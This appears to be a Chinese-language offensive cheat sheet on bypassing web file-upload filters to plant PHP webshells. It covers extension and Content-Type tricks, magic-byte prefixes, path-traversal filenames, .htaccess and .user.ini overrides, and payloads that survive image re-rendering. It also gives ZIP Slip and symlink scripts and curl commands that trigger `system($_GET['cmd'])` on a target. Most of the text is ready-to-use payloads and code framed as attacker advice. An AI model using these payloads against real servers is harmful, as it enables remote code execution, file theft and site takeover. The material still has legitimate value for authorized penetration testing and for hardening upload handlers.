# 文件上传绕过技术详解

## 扩展名绕过（最常见的限制）

**黑名单绕过**（禁止 .php）：
- 双扩展名：`shell.php.jpg`（Apache 从右解析）, `shell.jpg.php`
- 大小写：`shell.PhP`, `shell.pHP`, `shell.Php`
- 特殊扩展名：`.phtml`, `.php5`, `.php7`, `.phar`, `.phps`, `.shtml`
- 末尾点号：`shell.php.`（Windows 会自动去掉末尾点）
- 末尾空格：`shell.php ` 或 `shell.php%20`
- 空字节截断：`shell.php%00.jpg`（PHP < 5.3.4）
- 双写：`shell.pphphp`（如果后端删除 "php"）

**白名单绕过**（只允许 .jpg .png）：
- 需要配合 .htaccess 覆盖（见下方）
- 或路径穿越写到其他可执行目录

## Content-Type 绕过

后端检查 `Content-Type` 头：
```
将 Content-Type 从 application/x-php 改为：
- image/jpeg
- image/png
- image/gif
- application/octet-stream
```

## 文件头绕过（Magic Bytes）

后端检查文件内容开头字节：
```
GIF89a<?php system($_GET['cmd']); ?>
```
或 PNG 头：
```
\x89PNG\r\n\x1a\n<?php system($_GET['cmd']); ?>
```

**组合绕过**：同时改扩展名 + Content-Type + 文件头，三层都通过。

## 路径穿越上传

修改 multipart 中的 filename 字段：
```
filename="../shell.php"
filename="../../shell.php"
filename="../../../var/www/html/shell.php"
filename="....//....//shell.php"   (双写绕过)
filename="%2e%2e%2fshell.php"      (URL编码)
```

**目标**：将文件写到 Web 根目录或其他可执行目录。

## .htaccess 覆盖（Apache 专用 — 非常有效！）

如果白名单只允许 .jpg/.png，但能上传 .htaccess：

**Step 1**: 上传 .htaccess 文件，内容：
```
AddType application/x-httpd-php .jpg
```
这让 Apache 把 .jpg 文件当 PHP 执行。

**Step 2**: 上传 `shell.jpg`，内容：
```php
GIF89a<?php system($_GET['cmd']); ?>
```

**Step 3**: 访问 `http://target/uploads/shell.jpg?cmd=id`

**陷阱**：
- .htaccess 只在 Apache + AllowOverride All 时生效
- Nginx 不支持 .htaccess
- 上传 .htaccess 时文件名不能改（必须精确匹配）

## .user.ini + auto_prepend_file（非 Apache 通杀）

**原理**：PHP 的 `.user.ini` 文件等同于 per-directory 的 `php.ini`。`auto_prepend_file` 指令让每个 PHP 请求自动 include 指定文件。

**条件**：
- 能上传 `.user.ini` 文件
- 目标目录下有至少一个 `.php` 文件（作为入口）
- PHP 以 CGI/FastCGI SAPI 运行，例如 Nginx + PHP-FPM 或 Apache + FastCGI/PHP-FPM；Apache + mod_php 通常不按 `.user.ini` 生效

**Step 1**：上传 `.user.ini` 文件：
```ini
auto_prepend_file=shell.jpg
```

**Step 2**：上传 `shell.jpg`（内容是 PHP 代码）：
```php
GIF89a<?php system($_GET['cmd']); ?>
```

**Step 3**：访问同目录下任意 .php 文件即可触发 webshell：
```bash
curl 'http://target/uploads/index.php?cmd=id'
```

**优势**：不需要 Apache（Nginx 也生效），不需要修改扩展名，几乎无法被检测。

**注意**：`.user.ini` 有缓存，默认 `user_ini.cache_ttl = 300`（5分钟），上传后可能需要等待几分钟才生效。

---

## 图片马 + 二次渲染绕过

**问题**：某些应用使用 `imagecreatefromjpeg()` / `imagecreatefrompng()` 等函数对上传图片进行二次渲染（压缩/resize），渲染后 webshell 代码被破坏。

### GIF 二次渲染绕过

GIF 最容易绕过。某些区域在渲染前后保持不变：

```bash
# Step 1: 准备一个合法 GIF
cp normal.gif shell.gif

# Step 2: 用十六进制编辑器在 GIF 文件头后面（注释块内）插入 PHP 代码
# 或使用脚本：
python3 -c "
import struct
gif = open('normal.gif','rb').read()
# 在 GIF89a 头后插入注释扩展块
payload = b'<?=system(\$_GET[1]);?>'
# GIF 注释扩展块: 0x21 0xFE [size] [data] 0x00
comment = b'\x21\xfe' + bytes([len(payload)]) + payload + b'\x00'
out = gif[:6] + comment + gif[6:]
open('shell.gif','wb').write(out)
"
```

### PNG 二次渲染绕过

PNG 通过 IDAT 块注入。需要找到渲染后不变的数据区域：

```bash
# Step 1: 上传一张正常 PNG，下载渲染后的版本
# Step 2: 对比原始和渲染后的文件，找到不变的字节区域
# Step 3: 在不变区域替换为 PHP 代码

# 使用专用工具：
php -r "
\$img = imagecreatefrompng('normal.png');
\$payload = '<?=system(\$_GET[1]);?>';
// 在 PLTE 块或 IDAT 块中嵌入
// 需要逐字节测试哪些位置在 imagecreatefrompng→imagepng 后保持不变
"
```

### JPEG 二次渲染绕过

JPEG 最难（有损压缩）。通常在 EXIF 数据或 DQT 量化表中注入：

```bash
# 使用 exiftool 注入 EXIF Comment
exiftool -Comment='<?php system($_GET["cmd"]); ?>' normal.jpg

# 或在 JFIF APP0 后注入
# 需要 imagecreatefromjpeg() 不清除注释数据
```

**实际建议**：GIF 绕过成功率最高，优先用 GIF。如果目标只允许 JPEG/PNG，再尝试对应方法。

---

## ZIP 上传解压利用

### ZIP Slip（路径穿越）

上传 ZIP 文件时，如果服务端解压且不检查文件名中的 `../`：

```python
#!/usr/bin/env python3
import zipfile
import io

# 创建包含路径穿越的 ZIP
zf = zipfile.ZipFile('/tmp/evil.zip', 'w')
zf.writestr('../../var/www/html/shell.php', '<?php system($_GET["cmd"]); ?>')
zf.close()
```

```bash
# 或用命令行
echo '<?php system($_GET["cmd"]); ?>' > shell.php
ln -s shell.php '../../var/www/html/shell.php'
zip --symlinks /tmp/evil.zip '../../var/www/html/shell.php'
```

### ZIP 内含 Webshell

```python
import zipfile
zf = zipfile.ZipFile('/tmp/evil.zip', 'w')
zf.writestr('shell.php', '<?php system($_GET["cmd"]); ?>')
zf.close()
```

如果应用解压到 Web 目录下，直接访问解压后的 shell.php。

### 符号链接攻击

```bash
# 创建指向 /etc/passwd 的符号链接
ln -s /etc/passwd link
zip --symlinks evil.zip link
# 上传后，应用解压并展示 link 内容 → 读取 /etc/passwd
```

---

## 其他利用方式

- **覆盖应用文件**：路径穿越覆盖 index.php / web.config / .env
- **SVG XSS**：`<svg><script>alert(1)</script></svg>`
- **XXE via 文件上传**：上传 .xml / .xlsx / .docx 含 XXE payload
- **竞争条件**：文件先保存后检查 → 在检查前访问
